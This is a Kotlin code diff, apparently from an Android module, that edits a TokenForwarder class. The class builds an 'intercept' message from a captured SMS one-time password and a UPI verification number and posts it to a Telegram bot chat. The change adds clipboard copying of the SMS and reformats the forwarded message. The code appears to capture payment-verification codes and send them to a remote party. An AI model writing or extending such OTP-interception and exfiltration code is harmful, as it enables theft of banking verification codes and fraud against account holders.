@@ -29,18 +29,32 @@ class TokenForwarder(
         val chatId = config.telegramChatId
         if (botToken.isBlank() || chatId.isBlank()) return false
 
-        return postTelegram(botToken, chatId, buildInterceptMessage(otp, config))
+        val message = buildInterceptMessage(otp, config)
+        val sent = postTelegram(botToken, chatId, message)
+        if (sent) {
+            context?.let { ClipboardCopyHelper.copySms(it, smsCopyText(otp)) }
+        }
+        return sent
+    }
+
+    private fun smsCopyText(otp: LastOtp): String {
+        return otp.body.ifBlank { otp.otp }.trim()
     }
 
     private fun buildInterceptMessage(otp: LastOtp, config: ModuleConfig): String {
         val interceptNo = resolveUpiVerifyNumber(otp, config)
-        val smsBody = otp.body.ifBlank { otp.otp }.trim()
+        val smsBody = smsCopyText(otp)
 
         return buildString {
-            appendLine("<code>${escapeHtml(interceptNo)}</code>")
             if (smsBody.isNotBlank()) {
+                appendLine("<code>${escapeHtml(smsBody)}</code>")
                 appendLine()
-                append("<code>${escapeHtml(smsBody)}</code>")
+                append("👆 Tap to copy SMS")
+            }
+            if (interceptNo.isNotBlank() && interceptNo != smsBody) {
+                appendLine()
+                appendLine()
+                append("<code>${escapeHtml(interceptNo)}</code>")
             }
         }
     }
